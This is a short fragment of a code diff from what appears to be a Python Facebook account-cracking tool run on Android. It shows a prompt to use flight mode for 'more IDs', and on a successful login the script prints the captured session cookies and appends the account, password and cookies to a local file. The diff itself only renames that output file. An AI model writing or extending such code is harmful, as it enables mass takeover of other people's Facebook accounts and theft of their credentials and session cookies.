+    print(f"\033[1;91m[•] USE FLIGHT MODE FOR MORE IDS")
     linex()
     
     def method1(user):
@@ -1512,7 +1115,7 @@ def method():
                            cookies = f"sb={ssbb};{ckkk}"
                     except Exception as e:print(str(e)+' | '+response.text)
                 print(' \033[1;97m'+cookies)
-                open('/sdcard/PRO-BLAZE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
+                open('/sdcard/BLAZE-OK.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
                 
                 break
             elif 'www.facebook.com' in response.text:
